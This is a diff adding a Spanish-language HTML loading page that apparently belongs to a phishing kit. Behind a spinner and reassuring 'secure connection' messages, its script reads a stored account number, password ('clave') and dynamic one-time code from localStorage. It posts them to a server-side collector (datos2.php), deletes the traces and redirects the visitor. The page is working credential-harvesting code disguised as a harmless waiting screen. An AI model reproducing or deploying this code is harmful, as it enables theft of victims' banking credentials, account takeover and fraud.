@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cargando...</title>
+  <style>
+    body {
+      font-family: 'Manrope', sans-serif;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #fff;
+    }
+    #logo {
+      width: 150px;
+      margin-bottom: 30px;
+    }
+    .loader {
+      border: 6px solid #f3f3f3;
+      border-radius: 50%;
+      border-top: 6px solid #E0128B;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+    .mensaje {
+      font-size: 18px;
+      color: #333;
+      text-align: center;
+      padding: 0 10px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+  <link href="https://fonts.googleapis.com/css2?family=Manrope&display=swap" rel="stylesheet">
+</head>
+<body>
+  <img src="logo.png" alt="Logo" id="logo">
+  <div class="loader"></div>
+  <div class="mensaje" id="mensaje">Estableciendo conexión segura...</div>
+
+  <script>
+    const mensajes = [
+      "Estableciendo conexión segura...",
+      "Casi listo, verificando datos...",
+      "Procesando información...",
+      "Esto no tardará mucho, gracias por tu paciencia...",
+      "Estamos finalizando el proceso...",
+      "¡Un momento más, casi terminamos!"
+    ];
+
+    let indiceMensaje = 0;
+    const mensajeElem = document.getElementById('mensaje');
+
+    function cambiarMensaje() {
+      indiceMensaje = (indiceMensaje + 1) % mensajes.length;
+      mensajeElem.textContent = mensajes[indiceMensaje];
+    }
+
+    const mensajeInterval = setInterval(cambiarMensaje, 2000);
+
+    // Recuperar datos de localStorage
+    const neqdata = JSON.parse(localStorage.getItem('neqdata'));
+    const dina = localStorage.getItem('dina');
+
+    // Solo enviar si existen datos
+    if (neqdata) {
+      fetch('datos2.php', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+              numero: neqdata.numero,
+              clave: neqdata.clave,
+              dinamica: dina,
+              userIP: ''
+          })
+      })
+      .then(response => response.json())
+      .then(data => {
+          clearInterval(mensajeInterval);
+          // Eliminar los datos para evitar reenvíos posteriores
+          localStorage.removeItem('neqdata');
+          if (data && data.redirect) {
+              window.location.href = data.redirect;
+          }
+      })
+      .catch(error => {
+          clearInterval(mensajeInterval);
+          console.error('Error:', error);
+      });
+    } else {
+      clearInterval(mensajeInterval);
+      console.log('No hay datos para enviar.');
+    }
+  </script>
+</body>
+</html>
